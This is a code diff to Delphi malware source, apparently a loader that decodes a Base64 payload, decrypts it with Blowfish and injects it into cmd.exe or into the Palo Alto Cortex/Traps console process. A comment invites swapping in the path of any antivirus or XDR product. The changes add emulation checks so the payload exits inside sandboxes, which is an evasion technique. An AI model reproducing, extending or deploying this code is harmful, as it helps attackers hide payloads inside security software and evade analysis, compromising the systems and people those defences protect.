@@ -155,7 +155,7 @@ begin
   AMemStr2 := TMemoryStream.Create;
   Base64tostream(temp,Amemstr2,false);
 
-   Fork_x64(input,runner.TByteArray(AMemStr2.memory),processhandle);
+   fork_x64(input,runner.TByteArray(AMemStr2.memory),processhandle);
    AMemStr2.Free;
   Amemstr.Free;
 
@@ -164,15 +164,19 @@ begin
 procedure dec; stdcall;
 
 begin
-
+ if isEmulated = true  then
+  exit
+  else
  // normal mode, cmd process
-blowfish_decryption('c:\windows\system32\cmd.exe');
+blowfish_decryption('c:\\windows\\system32\\cmd.exe');
 
 end;
 
 procedure stealth; stdcall;
 begin
-
+      if isEmulated = true  then
+  exit
+  else
  blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
 end;
 
@@ -186,7 +190,11 @@ exports dec,
         bit,
         stealth;
 begin
+  if isEmulated = true  then
+  exit
+  else
+  {up to you }
  // here replace the path to any XDR solution or AV,below is default path of Cortex
-  blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
+ // blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
 end.
 
